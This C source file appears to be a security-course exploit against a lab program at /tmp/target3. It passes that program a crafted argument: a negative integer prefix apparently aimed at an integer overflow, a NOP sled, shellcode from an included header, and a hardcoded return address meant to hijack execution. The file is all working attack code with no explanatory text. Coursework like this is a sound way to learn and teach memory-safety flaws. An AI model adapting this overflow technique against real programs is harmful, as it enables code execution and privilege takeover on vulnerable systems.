#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];
  char attack[3250];
  //size_t test=(size_t)(-2147483547*32);
  //printf("%d\n",sizeof(args[1]));
  int i;
  attack[0]='-';
  attack[1]='2';
  attack[2]='1';
  attack[3]='4';
  attack[4]='7';
  attack[5]='4';
  attack[6]='8';
  attack[7]='3';
  attack[8]='5';
  attack[9]='4';
  attack[10]='7';
  attack[11]=','; 
  for(i=12;i<3250;i++)
     attack[i]=0x90;
  for(i=0;i<(sizeof(shellcode)-1);i++)
     attack[i+12]=shellcode[i];
  attack[3216]=0x28;
  attack[3217]=0xe5;
  attack[3218]=0xff;
  attack[3219]=0xbf;
  //printf("%s\n",attack);
  args[0] = TARGET;
  args[1] = attack;
  args[2] = NULL;
  env[0] = NULL;
  //printf("%d\n",sizeof(args[1]));
  //printf("%d\n",test);
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
